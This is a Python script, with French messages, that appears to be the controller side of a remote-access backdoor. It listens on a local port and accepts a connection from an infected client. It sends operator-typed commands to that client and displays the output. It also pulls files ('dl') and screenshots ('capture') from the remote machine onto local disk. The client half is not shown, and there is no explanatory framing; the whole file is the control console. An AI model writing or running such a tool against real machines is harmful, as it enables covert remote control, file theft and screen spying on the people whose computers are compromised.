import socket

HOST_IP = "127.0.0.1"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

def socket_receive_all_data(socket_p, data_len, timeout=300):
    current_data_len = 0
    total_data = b""
    socket_p.settimeout(timeout) 

    try:
        while current_data_len < data_len:
            chunk_len = min(data_len - current_data_len, MAX_DATA_SIZE)
            data = socket_p.recv(chunk_len)
            if not data:
                return None
            total_data += data
            current_data_len += len(data)
    except socket.timeout:
        pass 
    finally:
        socket_p.settimeout(None)  
    return total_data


def socket_send_command_and_receive_all_data(socket_p, command):
    if not command: 
        return None
    socket_p.sendall(command.encode())
    header_data = socket_receive_all_data(socket_p, 13)
    longeur_data = int(header_data.decode())

    data_recues = socket_receive_all_data(socket_p, longeur_data)
    return data_recues


s = socket.socket()
s.bind((HOST_IP, HOST_PORT))
s.listen(2)

print(f"Attente de connexion sur {HOST_IP}, port {HOST_PORT}...")
connection_socket, client_address = s.accept()
print(f"Connexion établie avec {client_address}")

dl_filename = None

while True:
    # ... infos
    infos_data = socket_send_command_and_receive_all_data(connection_socket, "infos")
    if not infos_data:
        break
    commande = input(client_address[0]+":"+str(client_address[1])+ " " + 
    infos_data.decode() + " > ")

    commande_split = commande.split(" ")
    if len(commande_split) == 2 and commande_split[0] == "dl":
        dl_filename = commande_split[1]
    elif len(commande_split) == 2 and commande_split[0] == "capture":
        dl_filename = commande_split[1] + ".png" 

    data_recues = socket_send_command_and_receive_all_data(connection_socket, commande)
    if not data_recues:
        break

    if dl_filename:
        if len(data_recues) == 1 and data_recues == b" ":
            print("ERREUR: Le fichier", dl_filename, "n'existe pas")
        else:
            f = open(dl_filename, "wb")
            f.write(data_recues)
            f.close()
            print("Fichier", dl_filename, "téléchargé.")
        dl_filename = None
    else:
        print(data_recues.decode())

s.close()
connection_socket.close()